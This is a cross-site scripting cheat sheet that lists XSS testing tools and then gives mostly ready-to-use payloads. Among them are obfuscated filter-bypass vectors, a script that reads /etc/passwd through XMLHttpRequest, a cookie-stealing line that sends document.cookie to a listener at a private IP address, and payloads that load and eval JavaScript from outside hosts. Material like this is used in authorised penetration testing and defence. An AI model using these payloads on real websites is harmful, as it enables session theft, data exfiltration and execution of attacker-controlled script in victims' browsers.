# Cross Site Scripting

Cross-site scripting (XSS) is a type of computer security vulnerability typically found in web applications. XSS enables attackers to inject client-side scripts into web pages viewed by other users and potentially read from browser storage amoung some of the simplest attacks.

[Tools](#tools)
[Payloads](#payloads)

## Tools

xsser [https://xsser.03c8.net/]

dalfox [https://dalfox.hahwul.com/docs/home/] 

XSpear [https://github.com/hahwul/XSpear]

domdig [https://github.com/fcavallarin/domdig]

XSSStrike [https://github.com/s0md3v/XSStrike]


## Sample Payloads

```
ufm"><a href=ja&#x0000A;va&#x73;cript&colon;al&#x65;rt``>
ufm"><a href="https://bing.com/" title="title">xss <img onerror=alert(1) src=x></a>
ufm"><a href="https://gitlab.com/wbowling/private-project/-/issues/1" title="title">xss &lt;img onerror=alert(1) src=x></a>
ufm"><svg/onload=write('\74img/src/o\156error\75alert\501\51\76')>
ufm"><iframe/onload=import(/\\Ǌ.₨/)>
ufm"><svg/onload=&#97&#108&#101&#114&#00116&#40&#41&#x2f&#x2f
ufm"><input onfocus=alert(document.domain) </autofocus>
ufm"><embed src=# onload=confirm(8)>
ufm"><input type="datetime-local"</onchange=alert(8)//
ufm"><img src=x onerror=eval(atob('YWxlcnQoJ0kgb25seSB3cml0ZSBsYW1lIFBvQ3MnKQ==')) />
ufm"><x/ onpointerRawupdatE=+alert&#40;document.domain&#41;>Tocuch me!
ufm"><img src='1' onerror='alert(0)' <
ufm"><svg/onload=location=`javas`+`cript:ale`+`rt%2`+`81%2`+`9`;//
ufm"><img src=1 alt=al lang=ert onerror=top[alt+lang](0)>
ufm"><script ~~~>confirm(1)</script ~~~>
ufm"><</script/script><script ~~~>\u0061lert(1)</script ~~~>
ufm"><img src onerror=\u0061\u006C\u0065\u0072\u0074(1) />
ufm"><img src onerror=\u{61}\u{6C}\u{65}\u{72}\u{74}(1) />
ufm"><object data="data:text/html;charset=iso-8859-7,%3c%73%63%72%69%70%74%3e%61%6c%65%72%74%28%31%29%3c%2f%73%63%72%69%70%74%3e"></object>
ufm"><Img Src=https://X55.is OnLoad=import(src)>
ufm"><iframe/src=https://X55.is onpointerRawupdatE=import(src)>
```

## Read a file

```
<script>x=new XMLHttpRequest;x.onload=function(){document.write(this.responseText)};x.open("GET","file:///etc/passwd");x.send();</script>
```

## Read a cookie

```
<script>new Image().src="http://192.168.119.208:8000/cool.jpg?output="+document.cookie;</script>
```

## Remote Javascript

```
ufm"><svg/onload='fetch("//host/a").then(r=>r.text().then(t=>eval(t)))'>
ufm"><script src=14.rs>
```

## DOM Based

| Vuln | JS to Use |
| ----              | ---- |
| DOM XSS           | `document.write()` |
| Open Redirect     | `window.location` |
| Read Cookies      | `document.cookie` |
